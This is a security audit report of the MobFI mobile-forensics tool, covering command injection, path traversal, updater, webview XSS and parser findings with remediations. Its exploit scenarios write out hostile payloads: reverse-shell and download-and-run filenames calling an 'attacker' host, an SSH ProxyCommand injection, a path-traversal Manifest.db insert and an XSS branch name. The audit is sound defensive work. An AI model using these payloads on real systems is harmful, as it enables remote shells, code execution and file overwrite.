# MobFI Security Audit

- Target: `github.com/integrisec/MobFI` at commit `b9c42e3`
  (branch `main`).
- Date: 2026-07-31.
- Scope: entire repo (`cmd/`, `internal/`, `scripts/`,
  `.github/`, `go.mod` / `go.sum`, `frontend/dist/`). 93 Go
  source files, ~13.7k LOC, 25 test files.
- Method: source-grounded review across 8 dimensions --
  command / argument injection, path traversal and archive
  handling, self-updater, Wails GUI IPC and rendered-content
  XSS, parser DoS against attacker-controlled device input,
  secrets scanner and its live-verification egress, dependency
  currency and known CVEs, and cross-cutting concerns (TLS
  clients, concurrency, evidence integrity, log hygiene).
  Every finding is anchored to a file:line in the target repo
  and includes a concrete attack scenario before the
  remediation. A companion license and attribution audit is
  in `LICENSE-AUDIT.md`.
- Threat model: hostile mobile device (untrusted APK / IPA
  content), network-adjacent attacker during update / SSH /
  verify egress, local unprivileged attacker racing tmp files,
  compromised release infrastructure (supply-chain), and any
  operator who hands a rendered report to a third party.
- Verdicts: `CONFIRMED` -- concrete exploit trace or
  code-quoted invariant break. `PLAUSIBLE` -- suspicion
  supported by the code path but not proved end-to-end.

## Executive summary

MobFI is a mobile-forensics tool that treats an untrusted phone
tree as its primary input, ships an in-process auto-updater, and
renders the results in a Wails webview. That combination puts it
at the intersection of three high-blast-radius controls: parsing
attacker-owned data, executing local code as a supply-chain
consumer, and rendering attacker-controlled bytes inside a JS
runtime with broad `Bind` access to the operator's filesystem.

Three findings are `CRITICAL`:

1. **MFI-UPD-01** -- the self-updater accepts a SHA-256 fetched
   from the same GitHub release as the binary. There is no
   cryptographic signature. Anyone who compromises the release
   pipeline signs their own binary trivially. Full RCE on every
   MobFI install.
2. **MFI-PATH-01** -- the iOS backup reconstruction
   (`internal/backup/backup.go:282`) joins the attacker-controlled
   `Manifest.db` `relativePath` into the destination without the
   `within()` guard that the other extract paths use. Manifest-db
   entries with `../../../` yield arbitrary local file overwrite
   with attacker-controlled bytes.
3. **MFI-CMD-01** -- in `su` mode, `internal/transport/adb.go`
   passes a single POSIX-quoted string to `su -c`, and `su -c`
   invokes `/system/bin/sh -c` a second time. Any device-supplied
   filename with `;`, `` ` ``, or `$(...)` executes on-device as
   root during a normal `Extract`.

The next tier (HIGH) covers non-`su` adb argv injection, symlink-
follow at `writeLocal`, absent CSP on the webview turning any
XSS into full local FS compromise, `StrictHostKeyChecking=accept-new`
+ `UserKnownHostsFile=/dev/null` on network SSH, three separate
plist-parser crash / OOM primitives from one malformed device
file, and a scanner data-contract that leaks raw secrets from
`ScanSecrets` into the JS layer.

The highest-payoff remediation cluster is:

1. Sign releases (fixes MFI-UPD-01 and neutralises MFI-UPD-05
   downgrade + MFI-UPD-06 TLS-trust weakness).
2. Add the missing `within()` guard in `reconstruct` (fixes
   MFI-PATH-01).
3. Switch `su -c` to `su 0 <argv...>` (fixes MFI-CMD-01 without
   touching every call site).
4. Add a Content-Security-Policy `<meta>` to `frontend/dist/index.html`
   (upgrades every downstream XSS from RCE-primitive to
   annoyance).
5. Strip `Secret` from the bound `Finding` return type; require
   an explicit `RevealFinding(idx)` (fixes MFI-SEC-01).

Fix status is tracked in `SECURITY-FIXES.md`.

---

## Table of findings

| ID | Severity | Verdict | Title |
|---|---|---|---|
| MFI-UPD-01 | Critical | CONFIRMED | No cryptographic signature on the auto-update binary |
| MFI-PATH-01 | Critical | CONFIRMED | Manifest.db `relativePath` -> arbitrary file write in `reconstruct` |
| MFI-CMD-01 | Critical | CONFIRMED | `su -c` double-shell in `adbConn` -> root RCE from device filename |
| MFI-CMD-02 | High | CONFIRMED | Non-`su` adb argv is device-shell-interpreted -> RCE as `shell` uid |
| MFI-CMD-03 | High | CONFIRMED | `ssh` argv option-injection via GUI console fields |
| MFI-CMD-04 | High | CONFIRMED | APK icon name from `aapt dump badging` shell-injects on device |
| MFI-CMD-05 | High | CONFIRMED | `open` / `xdg-open` flag-injection via extracted filenames |
| MFI-PATH-02 | High | CONFIRMED | `os.Create` follows symlinks at destination (planted-symlink write) |
| MFI-UPD-02 | High | CONFIRMED | Predictable `/tmp/mobfi-update-worker` opened without `O_EXCL` |
| MFI-UPD-03 | High | CONFIRMED | Git self-update runs `bash` / `powershell` install script with no signed-commit check |
| MFI-GUI-01 | High | CONFIRMED | No Content-Security-Policy on the webview |
| MFI-GUI-02 | High | CONFIRMED | Network SSH disables host-key verification |
| MFI-GUI-03 | High | CONFIRMED | XSS in update banner via `innerHTML` on git/release strings |
| MFI-PAR-01 | High | CONFIRMED | Binary plist unbounded recursion depth -> fatal stack overflow |
| MFI-PAR-02 | High | CONFIRMED | XML plist unbounded recursion -> fatal stack overflow |
| MFI-PAR-03 | High | CONFIRMED | Keybag `ITER`/`DPIC` attacker-set -> PBKDF2 CPU DoS |
| MFI-PAR-04 | High | CONFIRMED | Binary plist trailer arithmetic overflow -> giant `make` |
| MFI-SEC-01 | High | CONFIRMED | Raw secrets returned through Wails `ScanSecrets` binding |
| MFI-XC-01 | High | CONFIRMED | dbview WAL fallback mutates evidence side files |
| MFI-XC-02 | High | CONFIRMED | Verifier honours `HTTPS_PROXY` -> discovered secrets flow through corporate MITM |
| MFI-DEP-01 | High | CONFIRMED | `go 1.25.0` toolchain floor spans multiple stdlib CVEs |
| MFI-DEP-02 | High | CONFIRMED | `golang.org/x/net v0.54.0` dnsmessage panic (CVE-2026-46600) |
| MFI-UPD-04 | Medium | CONFIRMED | macOS / Linux `StartUpdate` binding has no server-side approval |
| MFI-UPD-05 | Medium | PLAUSIBLE | No downgrade floor on the binary update |
| MFI-UPD-06 | Medium | CONFIRMED | `http.DefaultClient` in updater: no pinning, no redirect check |
| MFI-GUI-04 | Medium | CONFIRMED | Broad `Bind` surface exposes local FS to any JS caller |
| MFI-GUI-05 | Medium | CONFIRMED | `ssh` user + host concatenated into one argv element |
| MFI-PAR-05 | Medium | CONFIRMED | Attacker-controlled inline count sizes `make([]any, N)` |
| MFI-PAR-06 | Medium | CONFIRMED | `dbview.Read` materialises whole result set in memory |
| MFI-PAR-07 | Medium | PLAUSIBLE | Keybag TLV length `int` cast panics on 32-bit / amplifies memory |
| MFI-SEC-02 | Medium | CONFIRMED | Verifier client follows redirects -> vendor tokens leak on 302 |
| MFI-SEC-03 | Medium | CONFIRMED | `redact()` leaks prefix + exact length of `known-secret` matches |
| MFI-SEC-04 | Medium | CONFIRMED | No per-host rate limit -> operator IP burned by crafted-input flood |
| MFI-XC-03 | Medium | CONFIRMED | No `SIGINT`/`SIGTERM` handler -> temp files with sensitive data orphaned |
| MFI-XC-04 | Medium | CONFIRMED | Exported reports carry absolute local paths -> operator + client PII leak |
| MFI-XC-05 | Medium | CONFIRMED | Child processes inherit full `os.Environ()` (AWS/GITHUB/ANTHROPIC tokens) |
| MFI-XC-06 | Medium | PLAUSIBLE | Silent-swallow on transport failure -> false-negative scan |
| MFI-CMD-06 | Medium | PLAUSIBLE | `adb connect/pair` and bundle-id argv accept leading `-` |
| MFI-DEP-03 | Medium | CONFIRMED | `golang.org/x/text v0.37.0` NFC infinite-loop (CVE-2026-56852) |
| MFI-UPD-07 | Low | CONFIRMED | Update download has no size cap -> disk-fill DoS |
| MFI-GUI-06 | Low | PLAUSIBLE | Chroma output written via `innerHTML` (defence-in-depth gap) |
| MFI-GUI-07 | Low | CONFIRMED | `OpenExternally` fires shell-handler on extracted file extension |
| MFI-GUI-08 | Low | PLAUSIBLE | PDF iframe not sandboxed; blob URLs never revoked |
| MFI-PAR-08 | Low | PLAUSIBLE | `reindentXML` depth bound only by 1 MB read cap |
| MFI-PAR-09 | Low | CONFIRMED | `plist.DecodeAny` on Manifest.db `Files.file` blob bypasses render cap |
| MFI-SEC-05 | Low | PLAUSIBLE | `slackVerify` reads response body unbounded |
| MFI-XC-07 | Low | CONFIRMED | `saveWindowState` writes without a mutex |
| MFI-XC-08 | Low | CONFIRMED | Console session ID is a `time.Now().UnixNano()` string |
| MFI-PATH-03 | Low | PLAUSIBLE | `dbview` DSN built via string concat -- fragile on Windows paths |
| MFI-PATH-04 | Low | CONFIRMED | Skipped-file record carries raw device bytes (log-injection surface) |
| MFI-CMD-07 | Low | PLAUSIBLE | `afcclient` accepts `-`-leading iOS filenames as flags |
| MFI-UPD-08 | Info | CONFIRMED | Post-update relaunch target unvalidated |
| MFI-UPD-09 | Info | PLAUSIBLE | Windows `.old` swap silently succeeds when process is still open |
| MFI-CMD-08 | Info | PLAUSIBLE | `dumpsys`-derived `dataDir` reaches shell argv |
| MFI-CMD-09 | Info | PLAUSIBLE | Simulator/iOS bundle-id shell-injects on `dumpsys package` |
| MFI-CMD-10 | Info | CONFIRMED | `keystore2.adbCatRoot` reuses the MFI-CMD-01 shape |

---

## Critical

### MFI-UPD-01 -- No cryptographic signature on the auto-update binary

- **Severity:** Critical
- **Verdict:** CONFIRMED
- **File:** `internal/selfupdate/apply.go:130-141`
- **Observation:** `applyBinary` downloads the release asset, fetches
  `SHA256SUMS.txt` from the same GitHub release, computes SHA-256
  locally, and compares with `strings.EqualFold`. That is the entire
  integrity chain. No detached signature (minisign, cosign, PGP,
  Sigstore) is ever checked; no public key is embedded in the binary.
- **Impact:** Anyone who obtains write access to the MobFI release
  channel (stolen maintainer credential, malicious release-workflow
  PR, insider, compromised GitHub App token, T1195.002) uploads
  a trojaned `mfi_<v>_<os>_<arch>` plus a matching
  `SHA256SUMS.txt`. Every MobFI client silently accepts, `chmod`s
  the binary `0o755`, `os.Rename`s it over the running executable
  (`apply.go:147`), and relaunches. This is the exact defect
  detached signing exists to defeat.
- **Remediation:** Sign every release asset. Embed the public
  key(s) as a compiled-in constant. Verify the signature over the
  downloaded binary before `Chmod` / `Rename` and refuse install
  on failure. Rotate via a small keyring so key loss is
  recoverable. `minisign` (small, well-understood) or Sigstore
  `cosign` (keyless + Rekor transparency log) both fit.

### MFI-PATH-01 -- Manifest.db `relativePath` -> arbitrary file write in `reconstruct`

- **Severity:** Critical
- **Verdict:** CONFIRMED
- **File:** `internal/backup/backup.go:282-298`
- **Observation:** `reconstruct` builds
  `local := extract.SafeJoin(o.Dest, domain+"/"+relPath)` and
  passes it to `copyFile` or `os.MkdirAll` **without a
  `within(o.Dest, local)` guard**. `extract.Run` and
  `extract.RunTar` DO apply that guard (`extract.go:79-82` and
  `:145-148`). `SafeJoin` -> `safeLocalPath` (`sanitize.go:20-26`)
  splits on `/`, runs `safeComponent` per element, then
  `filepath.Join`s -- and `filepath.Join`'s `Clean` resolves
  `..` lexically. There is no `..` rejection.
- **Exploit:** Attacker plants a hostile `Manifest.db` in a
  compromised device backup:
  ```sql
  INSERT INTO Files(fileID, domain, relativePath, flags)
  VALUES ('deadbeefabcd...', 'AppDomain-com.evil',
          '../../../../.ssh/authorized_keys', 1);
  ```
  With `Dest=/home/op/case-42`, `SafeJoin` yields
  `/home/.ssh/authorized_keys`. `copyFile`
  (`backup.go:337`) does `os.MkdirAll(filepath.Dir(dst),0o755)`
  + `os.Create(dst)` -> arbitrary file overwrite with
  attacker-controlled bytes (the source blob at
  `<backupDir>/de/deadbeef...` is also attacker-controlled).
  The `flags=2` (directory) branch has the same defect --
  arbitrary directory creation weaponisable to prepare a later
  write.
- **Impact:** Full arbitrary-file-write on the operator's host
  from a single hostile Manifest.db. `authorized_keys`,
  `.bashrc`, `crontab`, `sudoers.d/`, etc.
- **Remediation:** Insert immediately after the `SafeJoin`:
  ```go
  if !within(o.Dest, local) {
      res.Skipped = append(res.Skipped, extract.SkippedFile{
          Path: domain + "/" + relPath,
          Reason: "path escapes destination"})
      continue
  }
  ```
  Export `within` from `internal/extract` (or duplicate). Reject
  `relativePath` values containing NUL or embedded `\` (on
  Windows the backslash reinterprets), and reject a leading `/`.
  Add a regression test analogous to
  `TestRunRejectsPathEscape`.

### MFI-CMD-01 -- `su -c` double-shell -> root RCE from device filename

- **Severity:** Critical
- **Verdict:** CONFIRMED
- **File:** `internal/transport/adb.go:122-135`
- **Observation:** `adbConn.wrap` in `su` mode builds
  `"su -c " + shellQuote(joined)`. `shellQuote` produces
  `'joined'` with `'` -> `'\''`. That protects the OUTER
  on-device shell (the one `adb shell` spawns). But `su -c`
  itself invokes a SECOND `/system/bin/sh -c` on the string --
  so metacharacters inside `joined` execute inside that inner
  shell, as root.
- **Exploit:** A low-privilege app on the target device creates
  `/sdcard/Android/data/com.evil/files/foo;busybox nc attacker 443 -e /system/bin/sh #`.
  Operator runs `ConnectAsRoot` on the tree (a supported flow
  for rooted devices):
  - `adbConn.Walk` -> `find` -> callback returns the path.
  - `extract.Run` -> `conn.Open(ctx, p)` (`extract.go:88`).
  - `Open` -> `wrap("exec-out","cat",p)` builds
    `["-s",serial,"exec-out","su -c 'cat /sdcard/.../foo;busybox nc attacker 443 -e /system/bin/sh #'"]`.
  - Outer device shell sees `su -c 'cat ...;busybox nc ...'`
    as one argument.
  - `su -c` runs `sh -c "cat ...;busybox nc ..."` **as root**.
    The inner sh reinterprets `;`, executes the netcat.
- **Impact:** Full root RCE on device, achieved during a
  standard extraction flow. Note: this compromises the DEVICE,
  not the operator's host directly -- but on a target device it
  is a boundary crossing (app-uid -> root) that a forensics
  tool has no business creating.
- **Remediation:** Do not depend on `su -c '...'` splitting the
  outer shell exactly once. Prefer `su 0 -- <argv...>` (Magisk /
  SELinux-friendly form that keeps argv separate). If the `-c`
  form must stay, double-quote: `shellQuote(shellQuote(...))`
  and reject arguments containing `\0`, `\n`, `\r`. Add a
  targeted test with a filename containing `;` and a command
  that would trip the injection.

---

## High

### MFI-CMD-02 -- Non-`su` adb argv is device-shell-interpreted

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `internal/transport/adb.go:107-148`
- **Observation:** `adb shell A B C` and `adb exec-out A B C`
  concatenate argv with spaces and pass to `/system/bin/sh -c`
  on the device. Any variable argument that contains `;`,
  `` ` ``, `$()`, `|`, `&`, `>`, newline, backslash injects.
- **Exploit:** Same `find` -> callback -> `Open` chain as
  MFI-CMD-01 but without `su`. A filename `foo;wget attacker/pwn -O-|sh #`
  runs as the `shell` uid or, in `run-as pkg` mode, as the
  target app's uid. The `run-as` prefix does NOT contain the
  injection -- the injected sub-command runs inside the
  `run-as` shell.
- **Impact:** RCE on-device at the transport's chosen privilege
  level. Primary vector for the AFC/AppMeta/Extract flows.
- **Remediation:** Two options.
  1. Build the on-device command yourself, single-quote the
     WHOLE joined string, and pass it as one argument to
     `adb shell` (mirrors the shape `su` mode uses, without
     MFI-CMD-01's double-shell trap). Reject metacharacters
     upstream so `shellQuote` does not have to protect against
     everything.
  2. Reject filenames containing shell metachars in the
     `Walk` producer and surface them as skipped entries.
     Cheaper but partial -- adb `shell` still shells on every
     other invocation.

### MFI-CMD-03 -- SSH argv option-injection via GUI console fields

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/console.go:60-91`
- **Observation:** `sshUser`, `sshHost`, `sshPort` are pushed
  straight into the `ssh` argv (`user + "@" + sshHost`, and
  `sshPort` after `-p`). If either `sshUser` or `sshHost`
  starts with `-`, `ssh` parses the joined element as an
  option. `-oProxyCommand=...` runs on the OPERATOR's host via
  `/bin/sh -c` before ssh ever touches the target. CVE class
  CVE-2017-1000117 / CVE-2017-9800.
- **Exploit:** Operator imports (or is tricked into pasting) a
  hostile connection profile: `SSH user: -oProxyCommand=curl http://x/rce|sh`.
  Clicking Connect executes attacker payload on the pentester's
  box.
- **Remediation:** Refuse values starting with `-`, containing
  `=`, containing whitespace. Insert `--` in `args` before the
  `user@host` positional. Prefer `-l <user> <host>` so the two
  are separate argv elements. Same treatment for `iproxy`
  invocation earlier in the same function.

### MFI-CMD-04 -- APK icon-name shell-injection

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/appmeta.go:73-75` (input source
  `firstQuoted` `appmeta.go:157-203`)
- **Observation:** `entry` comes from parsing `aapt dump
  badging` output via `firstQuoted`, which extracts anything
  between two single quotes verbatim. It then feeds
  `adb -s ID exec-out unzip -p <apk> <entry>`. An APK whose
  manifest declares an icon resource named
  `res/x;wget http://a/e|sh #.png` executes attacker payload
  on the device as the `shell` uid.
- **Exploit:** Attacker publishes / sideloads a crafted APK.
  Operator selects the app in the GUI. The automatic AppMeta
  fetch fires the payload.
- **Remediation:** Whitelist `entry` to `[A-Za-z0-9._/-]+`
  before shipping to adb. Same guard partially mitigates
  MFI-CMD-02 at this call site.

### MFI-CMD-05 -- `open` / `xdg-open` flag-injection

- **Severity:** High (macOS confirmed), Medium (Linux plausible)
- **Verdict:** CONFIRMED (macOS), PLAUSIBLE (Linux/Windows)
- **File:** `cmd/mfi-gui/renderfile.go:111-125`
- **Observation:** `path` is user-selected from the extracted
  tree. On macOS `open <path>` treats a leading `-` as a flag
  (`-a AppName`, `-b bundleid`, `-e`, `-F`). A file named
  `-a Terminal` in the extract tree opens Terminal instead of
  the file. Chained with a script drop, `-a Terminal /path/attacker.sh`
  runs it in Terminal. `xdg-open` on Linux has similar `-`
  handling per handler.
- **Remediation:** Prepend `--` between the tool and the path
  where the tool supports it (`open -- path`). For tools that
  do not accept `--`, normalise `-` -> `./-` before the invocation.
  On Windows `cmd /c start "" <path>`, watch for embedded `"`
  in the path.

### MFI-PATH-02 -- `os.Create` follows pre-existing destination symlinks

- **Severity:** High
- **Verdict:** CONFIRMED (behaviour), PLAUSIBLE (real reach)
- **File:** `internal/extract/extract.go:180` (`writeLocal`),
  `internal/backup/backup.go:346` (`copyFile`)
- **Observation:** Both use `os.Create(local)` which is
  `OpenFile(name, O_RDWR|O_CREATE|O_TRUNC, 0666)` without
  `O_NOFOLLOW`. If `local` already exists as a symlink, Linux
  and macOS follow it and truncate the target.
- **Exploit:** A local unprivileged process on the operator's
  box (or a shared-mount case directory) races the extraction.
  Extraction subpaths are predictable -- they are the device
  paths (`shared_prefs/creds.xml`). Attacker
  `symlink(~/.ssh/authorized_keys, <Dest>/<device-path>)` before
  the write; `writeLocal` opens the symlink target and writes
  attacker-owned device-file bytes. SSH key insertion, sudoers
  drop, cron drop -- all possible.
- **Remediation:** Open with `O_NOFOLLOW` (or `O_EXCL` for
  a create-only flow):
  ```go
  f, err := os.OpenFile(local,
      os.O_WRONLY|os.O_CREATE|os.O_TRUNC|syscall.O_NOFOLLOW,
      0o600)
  ```
  Lower the mode from `0o666` to `0o600`. On Windows, use
  reparse-point-safe semantics or fall back to `Lstat`+
  `O_CREATE|O_EXCL`. Extraction into a fresh directory is a
  reasonable invariant to also enforce at the start.

### MFI-UPD-02 -- Predictable `/tmp/mobfi-update-worker` opened without `O_EXCL`

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/update.go:316-339` (`copyToTemp`)
- **Observation:** `filepath.Join(os.TempDir(), "mobfi-update-worker[.exe]")`
  opened `O_WRONLY|O_CREATE|O_TRUNC` (no `O_EXCL`). Classic
  Unix `/tmp` symlink race.
- **Exploit:** On a shared Unix host (or after a reboot with
  tmpfs `/tmp`), attacker Bob pre-plants
  `/tmp/mobfi-update-worker` as a symlink to a victim-writable
  target (`~/.bashrc`, `~/.ssh/authorized_keys`). Alice clicks
  "Update now"; her MobFI follows the symlink, `O_TRUNC`s the
  target, and writes the MobFI binary bytes to it. Combined
  with a shell rc target, next-shell RCE as Alice.
- **Remediation:** `os.CreateTemp(os.TempDir(), "mobfi-update-worker-*")`,
  or an `os.MkdirTemp` with a random suffix and the worker
  inside. Prefer `os.UserCacheDir()` + `MkdirAll(..., 0o700)`
  over `/tmp` on Unix.

### MFI-UPD-03 -- Git-checkout apply path is unauthenticated `bash|powershell` execution

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `internal/selfupdate/apply.go:61-110` (`applyGit`,
  `rebuildCmd`)
- **Observation:** `applyGit` `git pull --ff-only`s the public
  HTTPS URL then runs `bash scripts/install.sh ...` (Unix) or
  `powershell -ExecutionPolicy Bypass -File scripts\install.ps1 ...`
  (Windows). No commit-signature verification, no tag
  verification, no allowlist on what the install script may
  do. Env inherited.
- **Exploit:** Any adversary who can subvert the HTTPS path to
  `github.com` (rogue enterprise-MDM root CA, state-issued
  sub-CA, GitHub-side compromise) delivers attacker commits
  and MobFI executes them under the operator's account. The
  `-ExecutionPolicy Bypass` on Windows is deliberate PS-malware
  tradecraft, invoked here by design.
- **Remediation:** Require `git verify-commit HEAD` against a
  compiled-in maintainer keyring after pull, or pin to a signed
  annotated tag matched to the release. Isolate the rebuild with
  a scrubbed env (see MFI-XC-05).

### MFI-GUI-01 -- No Content-Security-Policy on the webview

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/frontend/dist/index.html`
- **Observation:** Only `charset` and `viewport` meta tags.
  Zero CSP. Every `innerHTML =` sink in `app.js` (lines 1565,
  1841, 2535, 2636) becomes a full RCE primitive because Bind
  exposes broad local FS (`RenderPath`, `ListDir`, `DBRead`,
  `RemoveDir`), process spawn (`OpenExternally`, `ExtractApp`,
  `AppMeta`, `ConnectTCP`, `PairTCP`, `ConsoleStart`), and
  clipboard access (`Copy`, `ClipboardGet`).
- **Exploit:** Any XSS anywhere in the app pivots to full
  workstation compromise from a hostile-device payload.
- **Remediation:** Add to `index.html` `<head>`:
  ```html
  <meta http-equiv="Content-Security-Policy" content="
      default-src 'none';
      script-src 'self';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data:;
      font-src 'self';
      connect-src 'self';
      frame-src blob:;
      object-src 'none';
      base-uri 'none';
      form-action 'none';">
  ```
  All frontend fetches are same-origin, so no relaxation is
  required beyond `style-src 'unsafe-inline'` for inline CSS
  (drop that too if styles are all in files). This alone
  neutralises MFI-GUI-03, MFI-GUI-06, MFI-GUI-08.

### MFI-GUI-02 -- Network SSH disables host-key verification

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/console.go:60`
- **Observation:** `sshOpts := []string{"-o", "StrictHostKeyChecking=accept-new", "-o", "UserKnownHostsFile=/dev/null"}`
  applied to both USB and network paths. `/dev/null` means no
  key is ever persisted -- every connect accepts and forgets,
  so no TOFU signal and no drift detection.
- **Exploit:** Operator SSHes to a jailbroken device on the LAN
  or VPN. On-path attacker (rogue Wi-Fi, ARP poisoning) presents
  a forged host key on the first connect and every connect
  thereafter. Operator types root's password into the attacker's
  SSH server; attacker MITMs and reads the whole authorised
  session.
- **Remediation:** Two-tier policy. For iproxy loopback
  (`user@127.0.0.1` over USB) the current opts are acceptable
  (localhost trust). For network SSH (non-empty `sshHost`),
  point at a real known-hosts file:
  `-o UserKnownHostsFile=~/.config/MobFI/known_hosts`,
  `-o StrictHostKeyChecking=accept-new`. First connect TOFUs;
  subsequent connects hard-fail on drift.

### MFI-GUI-03 -- XSS in update banner via `innerHTML` on git/release strings

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `frontend/dist/app.js:2636`, populating strings
  from `internal/selfupdate/selfupdate.go:179` (`info.gitBranch`
  from `git rev-parse --abbrev-ref HEAD`) and GitHub `tag_name`
  (`info.latest`).
- **Observation:** `msg.innerHTML = parts.join(" ")` where
  `parts` include raw `info.latest`, `info.current`,
  `info.gitBranch`, `info.gitBehind`. Neither `info.gitBranch`
  nor `info.latest` is escaped. Both admit `<`, `>`, `"`, `'`.
- **Exploit A (branch):** Attacker with FS write to the local
  MobFI source-repo checkout runs
  `git checkout -b '<img src=x onerror="fetch(\"/etc/shadow\").then(...)">'`.
  Next 6-hour update check tick fires arbitrary JS with full
  Bind access.
- **Exploit B (tag):** A supply-chain compromise tags a release
  `v1.2.3"><script>...</script>`. Pushed to every MobFI install
  worldwide on next check.
- **Remediation:** Replace `innerHTML` with DOM construction:
  `msg.textContent = ""; msg.append(...text nodes...)`. Or
  `escHtml()` each interpolated string before joining. `GitBehind`
  is int-typed so it's already safe.

### MFI-PAR-01 -- Binary plist unbounded recursion -> fatal stack overflow

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `internal/plist/plist.go:91,156,174`
- **Observation:** Cycle detection (`visiting` map, line 95)
  catches direct back-references only, not depth. A chain of
  N single-element arrays or dicts (each 2 bytes body + 1 byte
  offset) fits into the renderer's 1 MB cap at N approx.
  300 000 and much larger via the uncapped
  `backup_keychain.readPlistFile` / `fileKeyFromBlob`. Deep
  recursion exceeds `runtime.maxstacksize`; `throw("stack overflow")`
  is fatal and NOT catchable by the outer `recover` at line 38.
- **Exploit:** One `bplist00` fixture crashes the GUI process
  when the file is browsed or diffed.
- **Remediation:** Thread an int depth counter through `object`,
  `collection`, `dict`; error at depth > 128 with `errors.New("plist: nesting too deep")`.

### MFI-PAR-02 -- XML plist unbounded recursion -> fatal stack overflow

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `internal/plist/xml.go:110,130`
- **Observation:** `parseXMLArray` / `parseXMLDict` recurse
  without a depth counter and without an enclosing `recover`.
  `<array>` at 15 bytes/level fits ~66 k levels into the 1 MB
  cap and >1 M in the uncapped keychain paths.
  `encoding/xml` does not depth-limit tokens itself.
- **Remediation:** Same fix pattern as MFI-PAR-01: thread depth,
  cap at 128. Also add an outer `recover` in `DecodeAny` so a
  merely-large panic does not escape into Wails.

### MFI-PAR-03 -- Keybag PBKDF2 iteration count fully trusted

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `internal/keystore/keybag.go:110-112`
- **Observation:** `ITER` and `DPIC` are 32-bit big-endian ints
  copied straight from attacker-controlled TLV and fed into
  `pbkdf2.Key`. Nothing caps the upper limit. Legit iOS
  backups use ~10 000.
- **Exploit:** Forge Manifest.plist's `BackupKeyBag` so
  `ITER = 0xFFFFFFFF` (~4.29B). `unlock()` (called from
  `DecryptBackupKeychain`) spins one goroutine at 100% CPU for
  hours per attempt. Combined with `DPIC`, doubles.
- **Remediation:** Cap `iter`/`dpic` at 10^7 (four orders of
  magnitude above real values); error otherwise. Honour ctx
  cancellation so the operator can abort.

### MFI-PAR-04 -- Binary plist trailer arithmetic overflow

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `internal/plist/plist.go:61,66`
- **Observation:**
  `end := offsetTableOffset + numObjects*uint64(offsetIntSize)`.
  `numObjects` and `offsetIntSize` are attacker-controlled.
  Their product wraps in uint64. Example: `numObjects=2^61`,
  `offsetIntSize=8` -> product wraps to 0, guard passes, then
  `make([]uint64, numObjects)` tries to allocate `2^64`
  bytes.
- **Exploit:** Two regimes.
  - Very large -> `makeslice` panics -> caught by outer
    `recover` -> wasted decode.
  - Medium (`numObjects=1e8`, `offsetIntSize=1`, 100 MB file
    via uncapped path) -> allocates 800 MB. 8x memory
    amplification. Repeatable OOM.
- **Remediation:** Use `math/bits.Mul64` before the addition;
  reject on overflow. Separately gate
  `numObjects <= uint64(len(data))` before `make`.

### MFI-SEC-01 -- Raw secrets returned through Wails `ScanSecrets` binding

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `internal/secrets/secrets.go:34-46,136-142`;
  `cmd/mfi-gui/gui.go:318-334,341-355`
- **Observation:** `Finding.Secret` has JSON tag
  `json:"secret,omitempty"` and is populated on every match
  at `secrets.go:141` (`Secret: m`). The Wails binding
  `GUI.ScanSecrets` returns `[]secrets.Finding` unchanged; Wails
  serialises the struct with its own JSON tags. Every JS caller
  receives every raw secret in `finding.secret`. Redaction is
  applied only in the report path (`report.BuildWith` +
  `redact()`), not at the binding boundary.
- **Impact:** The README claims "Findings carry only a redacted
  fingerprint, never the raw secret." That is false for the GUI
  path. If any XSS ever lands (see MFI-GUI-01/03), the attacker
  can immediately exfiltrate every raw secret from the current
  session.
- **Remediation:** Either (a) return a `GUIFinding` type without
  the `Secret` field from every bound method, or (b) drop
  `Secret` from `Finding` entirely and keep raw values in a
  side map keyed by finding index, revealed only on
  explicit `RevealFinding(idx)` with an operator-gated modal.
  Minimum viable: add a `Redact()` helper that zeroes `Secret`
  and call it in `GUI.ScanSecrets` / `GUI.VerifyFindings`
  returns.

### MFI-XC-01 -- dbview WAL fallback mutates evidence side files

- **Severity:** High (integrity for a forensics tool)
- **Verdict:** CONFIRMED
- **File:** `internal/dbview/dbview.go:47-49`
- **Observation:** The DSN loop tries `mode=ro&immutable=1`,
  then `mode=ro`. `mode=ro` prevents writes to the main DB
  file, but SQLite may still create or modify `-journal`,
  `-wal`, `-shm` side files in the same directory when the DB
  is in WAL mode or was closed dirty. That directory is the
  evidence tree. The package comment and README both claim
  "opened read-only and immutable" / "the (already-copied)
  evidence file is left byte-for-byte untouched"; the sidecars
  break that.
- **Impact:** Chain-of-custody violation for a forensic tool.
  Hash of the evidence directory drifts.
- **Remediation:** Refuse the fallback; report the failure.
  Where WAL open is genuinely required, copy the `.db` + its
  `-wal` + `-shm` to a scratch dir first and open the copy
  (analogous to what `keystore2.go:39` does). Also set
  `MaxOpenConns=1` and `_journal_mode=memory`.

### MFI-XC-02 -- Verifier honours `HTTPS_PROXY` -> secrets flow through MITM

- **Severity:** High
- **Verdict:** CONFIRMED
- **File:** `internal/secrets/verify.go:66`
- **Observation:** `&http.Client{Timeout: verifyTimeout}` leaves
  `Transport` unset. `http.DefaultTransport` uses
  `http.ProxyFromEnvironment`. `HTTPS_PROXY` / `HTTP_PROXY` are
  honoured.
- **Impact:** Operator on a corporate laptop with a corp MITM
  proxy configured. Verify sends every discovered client secret
  (GitHub PAT, OpenAI, Anthropic, Stripe, Slack) to the MITM.
  Client credentials leak to a third party outside the ROE.
- **Remediation:** Build an explicit `&http.Transport{Proxy: nil, ...}`
  for verification. If proxy support is intentional, gate it
  behind an explicit CLI/GUI opt-in and warn in the confirm
  dialog. Related to MFI-SEC-02.

### MFI-DEP-01 -- `go 1.25.0` toolchain floor spans multiple stdlib CVEs

- **Severity:** High
- **Verdict:** CONFIRMED
- **Package:** `go.mod:3` `go 1.25.0`
